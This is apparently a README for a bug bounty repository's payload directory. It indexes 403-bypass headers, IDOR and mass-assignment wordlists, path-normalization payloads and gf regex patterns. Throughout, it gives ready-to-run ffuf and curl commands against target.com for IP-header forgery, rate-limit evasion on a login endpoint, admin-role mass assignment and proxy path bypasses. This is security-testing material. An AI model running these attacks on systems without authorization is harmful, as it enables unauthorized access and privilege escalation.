# 🎯 Payloads, Wordlists & Pattern Hub

This directory contains targeted wordlists, reverse-proxy bypass headers, and GF regex patterns tailored for high-signal bug bounty hunting.

---

## 📁 Directory Structure

```
payloads/
├── README.md                 # This index and usage manual
├── headers/
│   └── 403_bypass_headers.txt # 5,865 reverse-proxy & gateway bypass headers
├── wordlists/                # Targeted parameter & bypass wordlists (from auth_bypass_vault)
│   ├── auth_bypass_headers.txt        # 51 curated gateway/IP-forgery headers (quick rotation set)
│   ├── idor_parameters_wordlist.txt   # 89 IDOR/BOLA parameter names
│   ├── mass_assignment_parameters.txt # 95 privilege-escalation / mass-assignment parameters
│   └── path_normalization_payloads.txt# 43 proxy/backend path normalization bypasses
└── gf_patterns/              # Fast pattern matching for filtered parameter mining
    ├── idor.json             # Parameters vulnerable to BOLA / IDOR
    ├── lfi.json              # File path traversal & inclusion parameters
    ├── sqli.json             # Database injection parameters
    ├── ssrf.json             # Outbound request & webhook parameters
    └── xss.json              # Reflected & DOM XSS parameters
```

---

## 1. Reverse Proxy & 403 Bypass Headers (`headers/403_bypass_headers.txt`)

Contains 5,865 specialized HTTP header mutations gathered from modern bounty research, including:
- **Client IP Forgery:** `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 10.0.0.1`, `CF-Connecting-IP`, `True-Client-IP`, `X-Client-IP`, `X-Originating-IP`.
- **Path & URL Rewriting:** `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`, `X-Custom-IP-Authorization`.
- **Gateway & Host Poisoning:** `X-Host`, `X-Forwarded-Host`, `X-Forwarded-Proto: https`.

### How to Use:
1. **Automated via Script:**
   ```powershell
   .\scripts\test_403_bypasses.ps1 -Url "https://target.com/restricted" -HeadersFile "payloads\headers\403_bypass_headers.txt"
   ```
2. **With Burp Suite Intruder:**
   - Add target request to Intruder.
   - Set payload position on custom headers.
   - Load `403_bypass_headers.txt` as payload list.
3. **With FFUF:**
   ```bash
   ffuf -u https://target.com/restricted -H "FUZZ" -w payloads/headers/403_bypass_headers.txt -mc 200,302,301
   ```
4. **Governing Skill:** [`skills/infrastructure/forbidden_403_bypass.md`](../skills/infrastructure/forbidden_403_bypass.md)

---

## 2. Targeted Wordlists (`wordlists/`)

Curated, small-but-dense lists (sourced from the `auth_bypass_vault` intelligence collection) for precision fuzzing — use these when a full header dump is overkill.

### 2a. `auth_bypass_headers.txt` — Quick Gateway/IP Rotation (51 headers)
The hand-picked subset of `headers/403_bypass_headers.txt` for **rate-limit evasion and identity forgery** rotations: `X-Forwarded-For`, `X-Real-IP`, `CF-Connecting-IP`, `True-Client-IP`, `X-Original-URL`, and friends.
```bash
# Rate-limit evasion rotation loop (one header set per request)
while read -r h; do curl -s -o /dev/null -w "%{http_code} $h\n" -H "$h" "https://target.com/api/v1/login"; done < payloads/wordlists/auth_bypass_headers.txt
```
- **Governing Skill:** [`skills/state_management/rate_limiting_evasion.md`](../skills/state_management/rate_limiting_evasion.md)

### 2b. `idor_parameters_wordlist.txt` — IDOR/BOLA Parameter Mining (89 params)
`id`, `user_id`, `account_id`, `tenant_id`, ... for query-string fuzzing and JSON-body insertion on object endpoints.
```bash
# Probe object endpoints for IDOR-able parameters
ffuf -u "https://api.target.com/v1/users/123?FUZZ=456" -w payloads/wordlists/idor_parameters_wordlist.txt -mc 200 -H "Authorization: Bearer $TOKEN"
```
- **Governing Skill:** [`skills/auth_logic/logic_idor_auth.md`](../skills/auth_logic/logic_idor_auth.md)

### 2c. `mass_assignment_parameters.txt` — Privilege Escalation Parameters (95 params)
`role`, `is_admin`, `is_staff`, `bypass_mfa`, `permissions[]`, ... inject into registration/profile-update PUT/PATCH bodies to test unguarded field binding.
```bash
# Fan out on a profile-update endpoint
ffuf -X PATCH -u "https://api.target.com/v1/profile" -H "Content-Type: application/json" \
     -w payloads/wordlists/mass_assignment_parameters.txt -FUZZ '"admin"' \
     -request profiles/updates/http_template.txt 2>/dev/null || \
curl -s -X PATCH "https://api.target.com/v1/profile" -H "Authorization: Bearer $TOKEN" \
     -d '{"email":"me@x.com","is_admin":true,"role":"admin"}'
```
- **Governing Skill:** [`skills/auth_logic/logic_idor_auth.md`](../skills/auth_logic/logic_idor_auth.md) (Mass Assignment section)

### 2d. `path_normalization_payloads.txt` — Proxy/Backend Path Desync (43 payloads)
Semicolon/matrix (`/..;/admin`), double-encoding (`/%252e%252e/`), and trailing-dot/segment tricks for reverse-proxy vs backend normalization mismatches (Spring Boot, Tomcat, Jetty).
```bash
# Test a proxy-guarded admin route
while read -r p; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$p")
  [ "$code" != "403" ] && [ "$code" != "404" ] && echo "[!] $p -> $code"
done < payloads/wordlists/path_normalization_payloads.txt
```
- **Governing Skill:** [`skills/infrastructure/forbidden_403_bypass.md`](../skills/infrastructure/forbidden_403_bypass.md)
- **Related Guide:** reverse-proxy header bypass section in [`research/case_studies/INDEX.md`](../research/case_studies/INDEX.md)

---

## 3. GF Regex Patterns (`gf_patterns/`)

These JSON patterns are designed for Tomnomnom's `gf` tool or standard `grep` to extract specific parameter types from massive crawled URL lists (e.g. from `katana`, `gau`, or `waybackurls`).

### Installation into GF:
```bash
# Copy patterns to your local GF directory
mkdir -p ~/.gf
cp payloads/gf_patterns/*.json ~/.gf/
```

### Direct Usage with GF:
```bash
# Extract IDOR candidates
cat urls.txt | gf idor > idor_candidates.txt

# Extract SSRF candidates
cat urls.txt | gf ssrf > ssrf_candidates.txt

# Extract XSS candidates
cat urls.txt | gf xss > xss_candidates.txt

# Extract SQLi candidates
cat urls.txt | gf sqli > sqli_candidates.txt

# Extract LFI candidates
cat urls.txt | gf lfi > lfi_candidates.txt
```

### Fallback Usage with Grep / ripgrep:
If `gf` is not installed, parse directly using the regex strings contained inside the JSON files:
```bash
# Example: SSRF parameter extraction via ripgrep
rg -i "(=|%3d)(https?|ftp|file|data|gopher|dict|ldap|url|uri|redirect|dest|dest_url|next|link|callback|webhook|service|view)=?" urls.txt
```

### Governing Playbooks & Skills:
- **Playbook:** [`Methodology/BUG_BOUNTY_TOOLKIT_PLAYBOOK.md`](../Methodology/BUG_BOUNTY_TOOLKIT_PLAYBOOK.md)
- **IDOR Skill:** [`skills/auth_logic/logic_idor_auth.md`](../skills/auth_logic/logic_idor_auth.md)
- **SSRF Skill:** [`skills/infrastructure/backend_ssrf_rce.md`](../skills/infrastructure/backend_ssrf_rce.md)
- **XSS Skill:** [`skills/infrastructure/xss_variations.md`](../skills/infrastructure/xss_variations.md)
